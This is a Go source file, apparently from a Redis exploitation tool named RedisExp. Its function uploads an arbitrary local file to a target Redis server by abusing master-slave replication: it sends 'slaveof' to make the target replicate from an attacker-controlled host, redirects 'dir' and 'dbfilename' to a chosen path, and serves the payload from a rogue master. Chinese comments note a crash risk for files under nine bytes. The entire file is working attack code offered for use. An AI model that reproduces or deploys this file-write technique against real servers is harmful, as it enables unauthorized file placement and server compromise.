package slave

import (
	"fmt"
	"io"
	"os"

	"RedisExp/pkg/conn"

	"RedisExp/pkg/logger"
)

// RedisUpload 主从复制上传文件
func RedisUpload(lhost, lport, rpath, rfile, lfile string) {
	// 判断文件大小，发现个Redis  Bug 小于9个字节可能会把 Redis 给打崩
	fi, err := os.Stat(lfile)
	if err != nil {
		logger.Err("%v", err)
		os.Exit(0)
	}

	if fi.Size() < 9 {
		logger.Info(fmt.Sprintf("当前文件大小：%d 个字节，不能上传小于 9 个字节, 因为可能会把Redis打崩哦", fi.Size()))
		os.Exit(0)
	}

	// 上传文件
	f, err := os.Open(lfile)
	if err != nil {
		logger.Err("%v", err)
		os.Exit(0)
	}

	payload, err = io.ReadAll(f)
	if err != nil {
		logger.Err("%v", err)
		os.Exit(0)
	}

	logger.Info("正在上传文件")

	slave := fmt.Sprintf("slaveof %v %v", lhost, lport)
	dir := fmt.Sprintf("config set dir %v", rpath)
	file := fmt.Sprintf("config set dbfilename %v", rfile)

	conn.EchoRedisCMD(slave, dir, file)

	Listen(lport, payload)

	logger.Success(fmt.Sprintf("文件上传成功：%v", rfile))

	CloseSlave("", "upload")

}
